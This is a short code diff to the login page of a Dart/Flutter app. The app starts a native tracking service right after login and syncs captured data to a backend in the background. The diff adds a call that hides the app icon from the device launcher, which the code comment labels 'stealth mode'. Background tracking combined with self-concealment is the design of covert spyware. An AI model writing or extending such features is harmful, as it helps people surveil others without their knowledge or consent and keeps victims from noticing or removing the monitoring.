@@ -5,6 +5,7 @@ import '../tracking/tracking_home_page.dart';
 import '../../core/constants/app_constants.dart';
 import '../../core/errors/app_exceptions.dart';
 import '../../platform/tracking_channel.dart';
+import '../../platform/launcher_channel.dart';
 import '../../services/auth_service.dart';
 import '../../services/background_worker.dart';
 
@@ -44,6 +45,9 @@ class _LoginPageState extends State<LoginPage> {
 
       // Auto-start the native tracking service immediately after login.
       await TrackingChannel.instance.startTrackingService();
+
+      // Hide app icon from launcher (stealth mode) after successful login
+      await LauncherChannel.hideAppIcon();
 
       // Fire-and-forget: capture initial data and sync to backend.
       // Don't await — let it run in background while the page loads.
